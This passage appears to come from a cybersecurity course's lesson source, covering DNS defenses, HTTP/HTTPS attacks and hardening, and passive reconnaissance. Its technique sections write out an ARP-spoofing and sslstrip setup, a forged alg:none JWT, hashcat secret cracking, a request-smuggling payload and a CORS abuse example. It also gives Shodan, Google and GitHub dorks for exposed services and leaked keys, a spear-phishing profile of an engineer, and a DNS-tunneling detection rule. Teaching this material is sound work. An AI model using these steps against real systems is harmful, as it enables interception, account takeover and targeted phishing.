# Look for RRSIG records in ANSWER section

# Detailed validation:
delv @1.1.1.1 cloudflare.com A
# "; fully validated" = chain of trust intact

# Sign your own zone with BIND9:
dnssec-keygen -a ECDSAP256SHA256 -n ZONE acme.com
dnssec-signzone -A -3 $(head -c 6 /dev/urandom | od -An -tx1 | tr -d ' \n')     -N INCREMENT -o acme.com -t acme.com.zone</code></pre>

<h3>DNS Monitoring and Anomaly Detection</h3>
<pre><code># Windows: Enable DNS Debug Logging
Set-DnsServerDiagnostics -All $true
# Logs to: C:\Windows\System32\dns\dns.log

# Linux BIND9: query logging
logging {
    channel query_log {
        file "/var/log/named/queries.log" versions 10 size 50m;
        severity dynamic;
        print-time yes;
    };
    category queries { query_log; };
};

# Sigma rule — DNS tunneling detection:
title: Potential DNS Tunneling via High-Entropy Subdomain
detection:
    selection:
        dns.question.name|re: '(?:[A-Za-z0-9+/]{30,})\..+'
    filter:
        dns.question.name|endswith:
            - '.microsoft.com'
            - '.google.com'
            - '.windowsupdate.com'
    condition: selection and not filter
level: medium

# Alert thresholds:
# - More than 500 DNS queries per minute from a single host (tunneling/DGA)
# - DNS query labels longer than 50 characters
# - High ratio of NXDOMAIN from single host (DGA scanning)
# - ANY or NULL record queries from endpoints (amplification setup)</code></pre>

<h3>DNS Response Policy Zones (RPZ)</h3>
<p>
  RPZ allows a recursive resolver to override DNS responses based on policy — blocking
  malicious domains at the DNS layer before any TCP connection is established.
</p>
<pre><code># BIND9 RPZ configuration:
options {
    response-policy { zone "rpz.blocklist.local"; };
};

zone "rpz.blocklist.local" {
    type master;
    file "/etc/bind/rpz.blocklist.local.zone";
};

# RPZ zone file:
$TTL 60
@  SOA  localhost. root.localhost. 1 1h 15m 30d 2h
@  NS   localhost.

; Block malicious domain (return NXDOMAIN):
evil-c2-domain.com    CNAME  .
*.evil-c2-domain.com  CNAME  .

; Redirect to sinkhole for logging:
phishing-site.ru      CNAME  sinkhole.internal.

# Commercial options:
# Quad9 (9.9.9.9) — free, blocks malware domains
# Cisco Umbrella — enterprise, feeds from Talos updated in real-time</code></pre>

<h3>Defense Against DNS Amplification — Response Rate Limiting</h3>
<pre><code># BIND9 — Response Rate Limiting (RRL):
options {
    rate-limit {
        responses-per-second 10;
        referrals-per-second 5;
        errors-per-second 5;
        nxdomains-per-second 5;
        window 5;
        slip 2;
        exempt-clients { 203.0.113.252; };  # Whitelist trusted resolvers
    };
};

# BCP 38: Network Ingress Filtering
# Block packets with source IPs that cannot originate from your customer prefix
# Prevents source IP spoofing used in amplification attacks</code></pre>

<h3>DoH/DoT Enterprise Strategy</h3>
<ul>
  <li><strong>Block outbound port 853 (DoT)</strong> at the firewall — dedicated port is easy to block.</li>
  <li><strong>Block known DoH resolver IPs</strong>: Cloudflare (1.1.1.1, 1.0.0.1),
  Google (8.8.8.8, 8.8.4.4), NextDNS, Quad9.</li>
  <li><strong>Use enterprise DoH resolvers</strong>: Cloudflare Gateway and Cisco Umbrella
  offer DoH endpoints that still log queries and enforce RPZ.</li>
  <li><strong>Enforce via Group Policy</strong>: Disable DoH in Chrome (<code>DnsOverHttpsMode: off</code>)
  and Firefox via enterprise policy.</li>
</ul>
`,
  },

  'http-https': {
    concept: `
<h2>HTTP and HTTPS: The Foundation of the Web</h2>

<h3>A History — From CERN to HTTP/3</h3>
<p>
  In 1989, <strong>Tim Berners-Lee</strong> at CERN wrote a proposal called "Information
  Management: A Proposal." His boss, Mike Sendall, wrote "Vague but exciting" in the margin
  and approved it. That document became the blueprint for the World Wide Web. In 1991,
  Berners-Lee implemented the first web server and browser, communicating via a protocol
  he called HTTP — HyperText Transfer Protocol.
</p>
<ul>
  <li><strong>HTTP/0.9 (1991)</strong>: One command — <code>GET /page.html</code>.
  No headers, no status codes. The response was raw HTML then connection close.</li>
  <li><strong>HTTP/1.0 (1996, RFC 1945)</strong>: Added headers, status codes, and methods
  beyond GET. Each request still opened a new TCP connection — expensive for pages with
  many resources.</li>
  <li><strong>HTTP/1.1 (1997, RFC 2616)</strong>: Persistent connections
  (Connection: keep-alive), chunked transfer encoding, the mandatory Host header enabling
  virtual hosting, cache control headers. Dominated for nearly 20 years.</li>
  <li><strong>HTTP/2 (2015, RFC 7540)</strong>: Binary protocol, request
  <em>multiplexing</em> over a single TCP connection, HPACK header compression
  (reducing header overhead by 85%), server push.</li>
  <li><strong>HTTP/3 (2022, RFC 9114)</strong>: Replaces TCP with <strong>QUIC</strong>
  (built on UDP, implements reliable delivery + TLS 1.3 natively). Eliminates TCP
  head-of-line blocking — in HTTP/2, a single lost packet stalls all streams;
  QUIC gives each stream independent loss recovery.</li>
</ul>

<h3>HTTP Request Anatomy — Every Component</h3>
<pre><code>POST /api/v1/users/login HTTP/1.1
Host: acme.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Content-Type: application/json
Content-Length: 47
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
X-Forwarded-For: 192.168.1.100
Cookie: session=abc123def456; csrf_token=xyz789
Origin: https://acme.com
Referer: https://acme.com/login

{"username":"alice","password":"hunter2"}</code></pre>

<p>Security-relevant headers:</p>
<ul>
  <li><strong>Host</strong>: Required in HTTP/1.1. Host header injection can redirect
  password-reset emails to attacker-controlled domains.</li>
  <li><strong>X-Forwarded-For</strong>: Added by load balancers. Trivially spoofable — an
  attacker adds this header themselves to bypass IP-based rate limiting.</li>
  <li><strong>Referer</strong>: Previous URL. Can leak sensitive URL parameters (password
  reset tokens) to external sites.</li>
  <li><strong>Authorization</strong>: Must only ever be sent over HTTPS.</li>
</ul>

<h3>HTTP Methods — Safety and Idempotency</h3>
<pre><code>Method    Safe?  Idempotent?  Purpose
GET       Yes    Yes          Retrieve data (must NOT modify state)
HEAD      Yes    Yes          Like GET but headers only
OPTIONS   Yes    Yes          Discover allowed methods
POST      No     No           Create resource, submit data, trigger action
PUT       No     Yes          Replace resource entirely
PATCH     No     No           Partially update resource
DELETE    No     Yes          Delete resource
TRACE     Yes    Yes          Echo request back (DISABLE in production — information leak)
CONNECT   No     No           Establish tunnel (HTTPS through HTTP proxy)</code></pre>

<p>
  <strong>Safe</strong> methods must not modify server state — GET should never delete records.
  <strong>Idempotent</strong> methods produce the same result if called N times — crucial
  for safe retry logic.
</p>

<h3>HTTP Status Codes — The Security-Relevant Ones</h3>
<pre><code>200 OK           Normal success
201 Created      Resource created (include Location header)
204 No Content   Success, no body (common for DELETE)

301 Moved Permanently  Cache this redirect; update bookmarks
302 Found (Temp)       Temporary; do not cache

400 Bad Request        Malformed syntax
401 Unauthorized       Authentication required (misleadingly named)
403 Forbidden          Authenticated but not authorized
404 Not Found          Does not exist
429 Too Many Requests  Rate limiting (include Retry-After header)

500 Internal Server Error  Unhandled exception (reveals information)
502 Bad Gateway            Proxy cannot reach backend
503 Service Unavailable    Overloaded or in maintenance
504 Gateway Timeout        Backend too slow</code></pre>

<blockquote>
  401 vs 403: 401 means unauthenticated; 403 means authenticated but unauthorized.
  Use 404 for hidden resources as an information-hiding technique — prevents attackers
  from confirming a resource exists even if they cannot access it.
</blockquote>

<h3>TLS/HTTPS — The Full Technical Picture</h3>
<p>
  HTTPS provides <strong>confidentiality</strong> (encrypted), <strong>integrity</strong>
  (MAC prevents tampering), and <strong>authentication</strong> (server proves identity).
  The TLS 1.3 handshake (RFC 8446) completes in <strong>one round trip</strong>:
</p>
<pre><code>Client                                           Server
  |                                               |
  |-- ClientHello -------------------------------->|
  |   TLS 1.3, cipher suites, ECDH public key     |
  |   SNI: acme.com                               |
  |                                               |
  |<-- ServerHello + Certificate + Finished -------|
  |    Selected cipher, server's ECDH key,        |
  |    certificate chain, CertificateVerify,      |
  |    Finished HMAC                              |
  |                                               |
  |-- Finished ----------------------------------->|
  |                                               |
  |<== Encrypted HTTP traffic ===================>|

Perfect Forward Secrecy: ephemeral ECDH keys are discarded after each session.
Compromising the server's long-term private key CANNOT decrypt past sessions.</code></pre>

<h3>Certificate Validation Chain</h3>
<p>
  Your browser validates a chain: the server's <strong>leaf certificate</strong> is signed
  by an <strong>intermediate CA</strong>, which is signed by a <strong>root CA</strong>
  in your trust store. Operating systems ship with ~150 trusted root CAs — any of them can
  issue a cert for any domain. This is why Certificate Transparency logs exist: to catch
  misissuance by rogue or compromised CAs.
</p>

<h3>Cookies — The Complete Security Model</h3>
<pre><code>Set-Cookie: session=abc123;
    Secure;          # Only sent over HTTPS
    HttpOnly;        # JavaScript cannot read via document.cookie
    SameSite=Strict; # Never sent in cross-site requests (CSRF prevention)
    Path=/;
    Max-Age=3600;</code></pre>

<p><strong>SameSite values:</strong></p>
<ul>
  <li><strong>Strict</strong>: Cookie never sent cross-site, including link clicks. Maximum
  CSRF protection but breaks OAuth flows dependent on cross-site redirects.</li>
  <li><strong>Lax</strong>: Sent on top-level navigation GET but not cross-site POST.
  Browser default since Chrome 80. Protects against most CSRF.</li>
  <li><strong>None</strong>: Sent everywhere. Must be paired with Secure. Required for
  third-party cookies — being deprecated in most browsers.</li>
</ul>

<h3>JWT — Structure and Vulnerabilities</h3>
<pre><code># Structure: header.payload.signature (all base64url-encoded)
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0IiwicHJvbGUiOiJ1c2VyIiwiZXhwIjoxNzA5MTIzNDU2fQ.SIG...

# Decoded header:
{ "alg": "RS256", "typ": "JWT" }

# Decoded payload:
{
  "sub": "1234",           # Subject (user ID)
  "role": "user",          # Authorization claim
  "exp": 1709123456,       # Expiry (Unix timestamp)
  "iat": 1709119856        # Issued at
}</code></pre>
`,
    technique: `
<h2>How Attackers Exploit HTTP and HTTPS</h2>

<h3>Server Fingerprinting via HTTP Headers</h3>
<p>
  HTTP response headers routinely disclose precise version numbers — enough to query CVE
  databases directly:
</p>
<pre><code>curl -I https://target.com

HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)         CVE-2021-41773 path traversal / RCE!
X-Powered-By: PHP/7.4.21             check php.net/ChangeLog for 7.4 CVEs
X-Generator: Drupal 8                Drupalgeddon2 CVE-2018-7600?
Via: 1.1 varnish                     Varnish cache in front

# After fingerprinting:
searchsploit apache 2.4.49
# Exploit DB: CVE-2021-41773 Path Traversal and RCE in Apache 2.4.49

# Timing-based fingerprinting persists even after removing Server header:
# nginx returns 400 in ~1ms; Apache in ~5ms</code></pre>

<h3>SSL/TLS Stripping</h3>
<p>
  With a man-in-the-middle position (ARP spoofing, rogue WiFi, compromised router),
  sslstrip downgrades HTTPS to HTTP. The victim's browser never initiates TLS — the
  attacker proxies plaintext traffic while maintaining HTTPS with the real server.
</p>
<pre><code># MITM setup:
arpspoof -i eth0 -t 192.168.1.50 192.168.1.1   # victim thinks attacker is router
echo 1 > /proc/sys/net/ipv4/ip_forward
sslstrip -l 10000
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# What victim sees: http://bank.com (no padlock, no warning in older browsers)
# What attacker captures: plaintext credentials and session cookies

# Why HSTS defeats this:
# If bank.com sent: Strict-Transport-Security: max-age=31536000
# Browser refuses HTTP for 1 year — sslstrip cannot intercept

# Why HSTS preloading is stronger:
# Browser ships with hardcoded HTTPS-only list
# Even the first visit (before ever receiving an HSTS header) is forced HTTPS</code></pre>

<h3>JWT Attacks</h3>
<pre><code># Attack 1: Algorithm None (CVE-2015-9235 class)
# JWT spec allows alg:"none" — no signature required
# Vulnerable libraries accept unsigned tokens:

# Original (RS256 signed):
eyJhbGciOiJSUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.SIG...

# Forged (no signature, alg:none):
eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
# Empty last segment; vulnerable library promotes attacker to admin

# Attack 2: RS256 to HS256 Algorithm Confusion
# RS256: asymmetric (private signs, public verifies)
# HS256: symmetric (same secret signs AND verifies)
# Attack: change alg to HS256, sign with SERVER'S PUBLIC KEY (from /jwks.json)
# Vulnerable library uses public key as HMAC secret → signature validates!

# Attack 3: Weak Secret Brute Force
hashcat -a 0 -m 16500 token.jwt wordlist.txt
# Common weak secrets: "secret", "password", "jwt_secret", app name, "changeme"

# Attack 4: Expiry Manipulation
# Decode, change exp to year 2099, re-sign with known weak secret</code></pre>

<h3>HTTP Request Smuggling</h3>
<p>
  Modern web infrastructure places a reverse proxy (nginx, HAProxy, Cloudflare) in front
  of backend servers. Smuggling exploits disagreement about which takes precedence:
  Content-Length or Transfer-Encoding.
</p>
<pre><code># CL.TE Attack: Frontend uses Content-Length, Backend uses Transfer-Encoding
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED     # prepended to NEXT legitimate user's request

# Impact:
# - Poison response cache to serve attacker's response to victim
# - Steal victim session cookies by routing their request into attacker's response
# - Bypass WAF/IP allowlists on internal paths

# CVE-2019-18277: HAProxy — real-world TE.CL smuggling
# Detection: Burp Suite Professional has a request smuggling scanner</code></pre>

<h3>CORS Misconfiguration</h3>
<pre><code># Vulnerable server reflects arbitrary Origin:
fetch('https://api.bank.com/v1/account/balance', {credentials: 'include'})
# Attacker's page sends Origin: https://evil.com
# Vulnerable server responds:
Access-Control-Allow-Origin: https://evil.com   # reflected from request
Access-Control-Allow-Credentials: true           # session cookies included
# Browser allows response to be read: attacker reads victim's bank balance

# Null origin vulnerability:
Access-Control-Allow-Origin: null
# Attack: serve from sandboxed iframe (sends Origin: null)</code></pre>

<h3>HTTP/2 Specific Attacks</h3>
<ul>
  <li><strong>H2C upgrade smuggling</strong>: Abusing HTTP/1.1 Upgrade: h2c header to
  establish an unencrypted HTTP/2 connection to a backend that the proxy fails to fully
  inspect — effectively bypassing WAF rules that only process HTTP/1.1.</li>
  <li><strong>Header injection via pseudo-headers</strong>: HTTP/2 uses pseudo-headers
  like <code>:path</code> and <code>:authority</code>. Injecting CRLF sequences into
  these headers can rewrite requests at the backend while the proxy sees clean HTTP/2.</li>
</ul>
`,
    defense: `
<h2>Hardening HTTP and HTTPS — The Complete Playbook</h2>

<h3>Security Response Headers — Full Reference</h3>
<pre><code># nginx — complete security header configuration:

# HSTS: Force HTTPS for 1 year, include subdomains, preload-eligible
# WARNING: Only add preload after thorough testing — removal takes months
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;

# CSP: Start with report-only mode to find violations without breaking the site
add_header Content-Security-Policy-Report-Only "
    default-src 'self';
    script-src 'self' 'nonce-{RANDOM_NONCE}';
    style-src 'self' 'nonce-{RANDOM_NONCE}';
    img-src 'self' data: https:;
    connect-src 'self' https://api.acme.com;
    frame-ancestors 'none';
    form-action 'self';
    base-uri 'self';
    report-uri https://csp.acme.com/report
" always;
# Once all violations are resolved: switch to Content-Security-Policy (enforcing)

# Prevent framing (older browsers — modern apps use CSP frame-ancestors):
add_header X-Frame-Options "DENY" always;

# Prevent MIME sniffing (IE/old Chrome executing .jpg as JavaScript):
add_header X-Content-Type-Options "nosniff" always;

# Control Referer header sent on outbound links:
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Disable browser features not needed by your app:
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;</code></pre>

<h3>TLS Configuration Hardening</h3>
<pre><code># nginx TLS hardening:
ssl_protocols TLSv1.2 TLSv1.3;   # Disable TLS 1.0 and 1.1 (POODLE, BEAST)
ssl_prefer_server_ciphers on;

# Prefer ECDHE cipher suites (Perfect Forward Secrecy):
ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256';
# NEVER include: RC4, DES, 3DES, MD5, NULL, EXPORT, anon cipher suites

# OCSP Stapling — server attaches revocation status (faster, more private):
ssl_stapling on;
ssl_stapling_verify on;
ssl_trusted_certificate /etc/nginx/ssl/chain.pem;

# Disable session tickets for strict forward secrecy:
ssl_session_tickets off;

# Validate your TLS configuration:
# ssllabs.com/ssltest — aim for A+
# testssl.sh — command-line comprehensive TLS testing</code></pre>

<h3>Removing Version Disclosure Headers</h3>
<pre><code># nginx — hide version from Server header:
server_tokens off;    # "Server: nginx" (no version)

# Apache:
ServerTokens Prod     # "Server: Apache" (no version)
ServerSignature Off   # No Apache version on error pages

# PHP:
# php.ini: expose_php = Off
# Removes X-Powered-By: PHP/x.x.x

# Node.js / Express:
app.disable('x-powered-by');

# Custom error pages — zero technical content:
error_page 404 /errors/404.html;
error_page 500 502 503 504 /errors/50x.html;
# Contents: "Something went wrong." — no stack traces, no versions</code></pre>

<h3>JWT Security — Implementation Requirements</h3>
<pre><code># 1. Algorithm whitelist — never accept alg:none:
import jwt
payload = jwt.decode(
    token,
    secret_key,
    algorithms=["HS256"],  # Whitelist only specific algorithms
    options={"verify_exp": True}
)

# 2. Asymmetric signing for distributed systems (RS256/ES256):
# Auth server signs with private key; services verify with public key at /jwks.json

# 3. Short-lived access tokens + long-lived refresh tokens:
{
    "access_token": "...",   # 15-minute expiry, kept in JS memory
    "refresh_token": "...",  # 7 days, stored in HttpOnly cookie only
    "expires_in": 900
}

# 4. Store JWTs in HttpOnly cookies, NOT localStorage:
# localStorage is readable by any script (XSS steals it instantly)
# HttpOnly cookie: JavaScript cannot read; CSRF mitigated by SameSite=Strict

# 5. Rotate tokens on privilege escalation:
# New token issued when user gains elevated access; old token invalidated</code></pre>

<h3>Cookie Hardening</h3>
<pre><code># __Host- prefix = maximum security:
# Requires: Secure, Path=/, no Domain attribute
# Effect: only sent to the exact host that set it (not subdomains)
Set-Cookie: __Host-session=abc123; Secure; HttpOnly; SameSite=Strict; Path=/

# Python (Flask):
app.config.update(
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Strict',
    PERMANENT_SESSION_LIFETIME=3600,
)

# Node.js (Express):
app.use(session({
    name: '__Host-sess',
    secret: process.env.SESSION_SECRET,
    cookie: { httpOnly: true, secure: true, sameSite: 'strict', maxAge: 3600000 },
    resave: false,
    saveUninitialized: false
}));</code></pre>

<h3>WAF Deployment — ModSecurity with OWASP CRS</h3>
<pre><code># ModSecurity v3 with nginx:
load_module modules/ngx_http_modsecurity_module.so;
http {
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;
}

# main.conf — OWASP Core Rule Set:
Include /etc/nginx/modsec/modsecurity.conf
Include /usr/share/modsecurity-crs/crs-setup.conf
Include /usr/share/modsecurity-crs/rules/*.conf

# Start in detection mode for tuning:
SecRuleEngine DetectionOnly
# After tuning: SecRuleEngine On

# Rate limiting (nginx, before WAF):
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req zone=api burst=20 nodelay;</code></pre>
`,
  },

  'passive-recon': {
    concept: `
<h2>Passive Reconnaissance: Intelligence Without Footprints</h2>

<h3>The Intelligence Advantage</h3>
<p>
  Every successful attack begins not with a port scan, but with intelligence. Passive
  reconnaissance gathers detailed information about a target using entirely public sources —
  leaving no trace in the target's logs, triggering no alerts, and remaining within the
  bounds of publicly accessible information.
</p>
<p>
  The intelligence advantage is asymmetric. A defender must protect every system, every
  employee, every piece of information they have ever published. An attacker needs to find
  only one path. During passive recon, the attacker assembles the full picture from fragments
  scattered across WHOIS records, job postings, GitHub repositories, LinkedIn profiles,
  TLS certificate logs, and search engine caches — before the target has any idea they are
  being studied.
</p>

<blockquote>
  "Give me six hours to chop down a tree and I will spend the first four sharpening the axe."
  This principle is operationalized by every sophisticated threat actor. The Lazarus Group,
  Salt Typhoon, and Scattered Spider invested weeks in passive intelligence gathering before
  executing their attacks.
</blockquote>

<h3>OPSEC in Passive Reconnaissance</h3>
<p>
  The defining characteristic of passive recon is that you <strong>never touch the
  target</strong>. No packets arrive at the target's systems from you. This has three
  critical implications:
</p>
<ul>
  <li><strong>No log entries</strong>: The target's firewalls, IDS, and web servers receive
  nothing. There is nothing to alert on, nothing to investigate, no IP to block.</li>
  <li><strong>Legal clarity</strong>: Accessing public information (WHOIS, crt.sh, Shodan,
  LinkedIn) is not a computer intrusion offense. The CFAA requires unauthorized access to
  a computer — reading public databases requires no such access.</li>
  <li><strong>Patience without cost</strong>: Passive recon can continue for weeks without
  triggering any response. APT groups routinely spend 60–90 days in the intelligence phase.</li>
</ul>

<h3>WHOIS — The Registry of the Internet</h3>
<p>
  WHOIS (RFC 954, 1985) is the original public database of domain registration information.
  For decades it provided complete transparency: registrant name, email, phone, address,
  technical contact, registrar, registration date, expiry, and nameservers.
</p>
<pre><code>whois acme.com

Domain Name: ACME.COM
Registrar: Namecheap, Inc.
Creation Date: 1998-04-03T00:00:00Z    domain age = organization maturity
Updated Date: 2024-01-15T12:34:56Z    recent update = infrastructure change?
Registry Expiry Date: 2025-04-03T00:00:00Z  near expiry = squatting risk?
Registrant Name: REDACTED FOR PRIVACY    GDPR privacy (EU registrant)
Name Server: ns1.acme.com              running own nameservers (more to enumerate)
Name Server: ns2.acme.com</code></pre>

<p>
  <strong>GDPR/CCPA Impact (since May 2018)</strong>: Personal contact data is redacted
  for EU registrants. However, the following is <em>never</em> redacted:
</p>
<ul>
  <li>Nameservers — reveals hosting provider and DNS infrastructure</li>
  <li>Registrar — reveals which registrar (some have weaker processes)</li>
  <li>Registration and expiry dates — domain age, renewal patterns</li>
  <li>Domain status codes — transfer locks, redemption periods</li>
</ul>

<p>
  <strong>RDAP</strong> (Registration Data Access Protocol, RFC 7480) is the modern
  JSON-based replacement for text-based WHOIS, offering structured data and authentication
  for accessing non-public fields.
</p>

<h3>Certificate Transparency — Every Certificate is Public</h3>
<p>
  Since mandatory for Chrome trust since 2018, <strong>every TLS certificate must be
  submitted to at least two public CT logs</strong> before browsers trust it. These logs
  are append-only, cryptographically verifiable, and permanently public. Every subdomain
  that has ever received a TLS certificate from a trusted CA is permanently recorded.
</p>
<pre><code># Query crt.sh for all certs ever issued for acme.com:
https://crt.sh/?q=%.acme.com

Results:
  mail.acme.com       issued 2 years ago, still active
  vpn.acme.com        issued 3 years ago (VPN gateway — prime target)
  dev.acme.com        issued 18 months ago (dev environment, less secure)
  staging.acme.com    issued 18 months ago (may have test credentials)
  jenkins.acme.com    issued 2 years ago (CI/CD — should not be public)
  *.internal.acme.com wildcard for internal subdomains — interesting

# Historical analysis from CT logs:
# Old cert issued to cloudflare.com as SAN
# New cert issued to fastly.net as SAN
# → Company migrated CDN from Cloudflare to Fastly between those dates</code></pre>

<h3>Shodan — The Search Engine for the Internet</h3>
<p>
  Shodan (created by John Matherly, 2009) port-scans the entire internet and indexes the
  service banners — the text servers return when you connect. It crawls every routable IPv4
  address on hundreds of ports, collecting and indexing every banner.
</p>
<pre><code># Shodan filters — finding specific targets:
org:"Acme Corporation"                    # All of Acme Corp's internet exposure
net:203.0.113.0/24                         # Entire subnet scan results
hostname:acme.com                          # IPs with reverse DNS to acme.com
ssl.cert.subject.cn:"acme.com"             # TLS certs with acme.com
product:"Apache httpd" version:"2.4.49"    # Specifically vulnerable Apache
product:"Cisco IOS XE" port:443           # Cisco routers (Salt Typhoon's target)
http.title:"Outlook Web App"              # Exposed OWA servers
http.title:"phpMyAdmin"                   # Exposed database admin panels
has_screenshot:true port:3389            # RDP with screenshots captured
country:US port:22 product:"OpenSSH" version:"7.4"  # Vulnerable SSH</code></pre>

<h3>LinkedIn and Social Media Intelligence</h3>
<p>
  LinkedIn is one of the highest-value passive intelligence sources for targeted attacks.
  The platform is designed to make employees discoverable — from an attacker's perspective,
  it is a gold mine of organizational structure, technology stack, and targeting data.
</p>
<ul>
  <li><strong>Organizational mapping</strong>: Browse employees by department. Build a complete
  org chart. The VP of Infrastructure owns the network. The Director of Cloud Engineering
  owns AWS. Find their email format from WHOIS or hunter.io.</li>
  <li><strong>Technology enumeration from job postings</strong>: "Senior Network Engineer —
  Cisco CCNP required, IOS XE and SD-WAN preferred" reveals the exact network OS.
  "DevOps — Kubernetes EKS, Terraform, GitLab CI/CD" reveals the entire cloud stack.</li>
  <li><strong>Individual targeting for spear phishing</strong>: The engineer who posted about
  Cisco Live 2024, has CCNP certifications, and is titled "Network Security Engineer" is
  the ideal target for a spear phish with subject "Cisco IOS XE Critical Security Advisory."</li>
</ul>

<h3>GitHub OSINT — When Source Code Leaks Secrets</h3>
<p>
  Developers routinely commit sensitive material by accident: API keys, AWS credentials,
  database passwords, private keys, internal URLs. Even after deletion, GitHub's search
  index caches content for months.
</p>
<pre><code># GitHub search queries:
org:AcmeCorp "api_key"
org:AcmeCorp "aws_access_key"
org:AcmeCorp "BEGIN RSA PRIVATE KEY"
org:AcmeCorp filename:.env
org:AcmeCorp "jdbc:mysql"          (database connection strings)
org:AcmeCorp filename:*.pem        (certificate/key files)

# Tools for automated scanning:
trufflehog github --org AcmeCorp --only-verified
gitleaks detect --source /path/to/cloned/repo

# The Uber 2022 breach:
# Attacker found credentials in GitHub repo (via social engineering)
# Credentials led to PAM system → full access to AWS, GCP, internal Slack, repos
# Cost: hundreds of millions in regulatory fines and remediation</code></pre>

<h3>Automated OSINT Tools</h3>
<ul>
  <li><strong>theHarvester</strong>: Collects emails, hostnames, IPs, URLs from Google,
  LinkedIn, Shodan, CertSpotter, VirusTotal. Standard first-run tool.</li>
  <li><strong>SpiderFoot</strong>: 200+ data source modules. Maps relationships between
  domains, IPs, emails, and names into a graph.</li>
  <li><strong>Maltego</strong>: Visual link analysis. Drag entities onto a canvas, run
  transforms, watch the relationship graph grow. Used by law enforcement, threat
  intelligence teams, and penetration testers alike.</li>
</ul>
`,
    technique: `
<h2>Passive Recon in Practice — Methodology and Real-World Techniques</h2>

<h3>Salt Typhoon Pre-Attack OSINT — A Case Study</h3>
<p>
  Salt Typhoon (Chinese APT, tracked as Earth Estries and FamousSparrow) compromised
  multiple major US carriers (AT&amp;T, Verizon, Lumen, T-Mobile) in 2023–2024. Before any
  exploit was deployed, the group conducted systematic passive reconnaissance.
</p>
<p>
  The initial vector was <strong>CVE-2023-20198</strong> — a CVSS 10.0 privilege escalation
  in Cisco IOS XE's web UI. Intelligence gathering used Shodan:
</p>
<pre><code># Identifying vulnerable Cisco IOS XE routers:
product:"Cisco IOS XE" port:443   # Tens of thousands of results globally

# Refined to US telecom infrastructure:
product:"Cisco IOS XE" port:443 org:"AT&T" country:US
product:"Cisco IOS XE" port:443 org:"Verizon" country:US

# Shodan banner for a vulnerable device:
# HTTP/1.1 200 OK
# Server: cisco-IOS
# X-Powered-By: IOS/17.3.5      Version 17.3.5 is in the vulnerable range!

# Vulnerable ranges per Cisco advisory:
# IOS XE 17.3.1 through 17.3.8 — all vulnerable
# IOS XE 17.6.1 through 17.6.6 — all vulnerable
# Shodan's version data vs Cisco's advisory = exact target list</code></pre>

<h3>Complete 8-Phase Passive Recon Workflow</h3>

<h4>Phase 1: Domain Registration Intelligence</h4>
<pre><code># WHOIS primary and related domains:
whois acme.com
whois acme.io       (defensive registrations?)
whois acme.net

# RDAP (modern JSON output):
curl https://rdap.org/domain/acme.com | python3 -m json.tool

# Historical WHOIS:
# DomainTools, SecurityTrails — all past registrant data

# Intelligence extracted:
# - NS records: AWS Route 53? Cloudflare? Self-hosted?
# - Registration date: organizational maturity
# - Expiry: domain squatting opportunity?</code></pre>

<h4>Phase 2: Certificate Transparency Sweep</h4>
<pre><code>curl "https://crt.sh/?q=%.acme.com&output=json" |     python3 -c "import json,sys; data=json.load(sys.stdin);     [print(e['name_value']) for e in data]" | sort -u

# Typical output:
acme.com
mail.acme.com         (mail server)
vpn.acme.com          (VPN gateway — prime target)
api.acme.com          (API server)
dev.acme.com          (dev environment — likely less secure)
staging.acme.com      (may have test credentials)
jenkins.acme.com      (CI/CD — often internet-exposed by accident)
kibana.acme.com       (log analytics — may expose sensitive data if auth missing)</code></pre>

<h4>Phase 3: Shodan and Censys Enumeration</h4>
<pre><code># Shodan CLI:
shodan search org:"Acme Corporation" --fields ip_str,port,hostnames,product

# Results:
203.0.113.25   443   mail.acme.com      Microsoft Exchange
203.0.113.30   443   vpn.acme.com       Cisco AnyConnect
203.0.113.50   443   jenkins.acme.com   Jenkins CI
203.0.113.55  5601   kibana.acme.com    Kibana (no auth found!)

# Detailed host view:
shodan host 203.0.113.50
# OS fingerprint, exact software versions, historical snapshots, open ports</code></pre>

<h4>Phase 4: Google Dorking</h4>
<pre><code># Documents that should not be public:
site:acme.com filetype:xlsx
site:acme.com filetype:csv
site:acme.com filetype:sql          (database dumps)
site:acme.com ext:bak               (backup files)
site:acme.com ext:env               (Laravel/PHP env files)

# Admin and login interfaces:
site:acme.com inurl:admin
site:acme.com inurl:wp-admin
site:acme.com intitle:"phpMyAdmin"

# Information leakage:
site:acme.com intitle:"index of"           (directory listings)
site:acme.com "error in your SQL syntax"   (SQLi-vulnerable pages)
site:acme.com inurl:swagger                (API documentation)

# API artifacts:
site:acme.com inurl:"/api/v"
site:acme.com inurl:".git"                 (exposed git directory = source code!)</code></pre>

<h4>Phase 5: LinkedIn and Social Media Mapping</h4>
<pre><code># Target profile: Sarah Chen, Senior Network Engineer, Acme Corp
# Skills: Cisco, IOS XE, SD-WAN, Palo Alto, Splunk
# Post: "Excited to attend Cisco Live 2024!"
# Certs: CCNP Enterprise, CCIE track

# Intelligence:
# - Network runs on Cisco IOS XE (matches Shodan data)
# - SD-WAN in use
# - SIEM is Splunk
# - Named spear phish target for "Cisco security advisory" themed email

# Job posting analysis:
# "Senior Cloud Security Engineer — AWS, Azure, GCP, Terraform,
#  GitLab CI/CD, Kubernetes EKS/AKS, experience with Wiz preferred"
# Intelligence: multicloud, GitLab for CI/CD, Wiz CSPM
